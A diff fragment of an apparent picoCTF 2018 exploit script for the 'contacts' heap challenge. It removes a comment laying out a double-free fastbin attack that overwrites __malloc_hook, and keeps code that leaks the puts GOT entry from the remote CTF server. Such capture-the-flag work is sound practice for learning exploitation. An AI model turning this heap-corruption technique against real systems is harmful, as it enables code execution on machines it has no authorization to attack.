@@ -247,20 +247,6 @@ def leak(p, c):
 
 def break_heap():
     p = remote('2018shell2.picoctf.com', 56667)
-    #p = process(['/home/mithreindeir/picoctf/ld-linux-x86-64.so.2', '/home/mithreindeir/picoctf/contacts'], setuid=False, env={"LD_PRELOAD":"./libc.so.6"})
-    ''' Methodology:
-        1). Exploit first fit and no initializers to preset bio function
-        2). Double free vulnerability lets us control heap metadata by:
-            - Allocating and freeing several chunks
-            - Allocating chunk with size of several previous chunks
-            - Changing metadata with current chunk
-            - Double freeing one of the first chunks
-        3). Double free fastbin with overwritten ptr that lets us control __malloc_hook
-            - __malloc_hook is called every malloc
-            - we can pass the fastbin size check by unaligning their addresses to get the MSB
-              of anything as the size for the fastbin
-            - So we can do this with
-    '''
     puts = struct.pack("L", 0x602020)
     A = alloc(p, "user")
     # Put &puts@got.plt into heap with padding to make size of user struct
